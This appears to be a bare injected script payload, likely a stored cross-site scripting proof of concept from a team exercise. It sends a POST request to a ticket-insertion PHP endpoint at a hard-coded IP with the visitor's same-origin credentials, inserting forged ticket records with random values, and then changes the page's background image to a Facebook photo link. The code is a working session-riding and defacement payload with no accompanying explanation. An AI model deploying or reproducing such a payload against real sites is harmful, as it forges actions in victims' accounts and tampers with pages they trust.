...
<script>
    fetch("http://140.123.175.101:8080/team02/account/insertticket.php",{
    method:"post",
    credentials: "same-origin",
    headers:{
        "Content-Type":"application/x-www-form-urlencoded"
    },
    body:`ticket_id=${Math.floor(Math.random()*1000)}&amount_origin=${Math.floor(Math.random()*1000)}&start=taoyuan&end=taoyuan&price=${Math.floor(Math.random()*1000)}`
})
.then(res=>res.text())
.then(console.log)

document.body.style.backgroundImage="url(https://www.facebook.com/photo.php?fbid=808239195942707&set=a.103183306448303.3084.100002699013862&type=3&theater)"
</script>
